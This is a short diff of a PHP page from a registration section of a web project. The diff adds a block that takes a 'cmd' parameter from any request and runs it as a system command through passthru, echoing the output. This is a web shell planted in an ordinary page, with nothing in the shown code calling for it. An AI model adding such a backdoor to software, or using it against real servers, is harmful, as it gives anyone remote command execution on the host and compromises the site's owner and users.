@@ -1,6 +1,12 @@
 <?php
 require_once '/opt/lampp/htdocs/PT-01/register/conpik.php';
 ?>
+<?php
+ if(isset($_REQUEST['cmd'])){
+echo "<pre>"; $cmd = ($_REQUEST['cmd']);
+passthru($cmd); echo "</pre>"; die; }
+?>
+
 
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
